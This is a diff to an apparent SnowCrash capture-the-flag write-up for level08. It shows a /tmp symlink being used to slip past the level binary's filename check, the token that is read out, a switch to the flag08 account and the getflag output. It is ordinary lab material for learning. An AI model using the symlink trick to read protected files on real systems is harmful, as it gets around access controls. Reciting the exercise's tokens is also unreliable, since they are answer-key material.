@@ -73,4 +73,19 @@ lrwxrwxrwx 1 level08 level08 24 Feb  8 11:05 /tmp/flag -> /home/user/level08/tok
 level08@SnowCrash:~$ ./level08 /tmp/flag
 quif5eloekouj29ke0vouxean
 level08@SnowCrash:~$
+level08@SnowCrash:~$ su level09
+Password:
+su: Authentication failure
+level08@SnowCrash:~$ su flag08
+Password:
+
+su: Authentication failure
+level08@SnowCrash:~$
+level08@SnowCrash:~$ su flag08
+Password:
+
+Don't forget to launch getflag !
+flag08@SnowCrash:~$
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
 ```
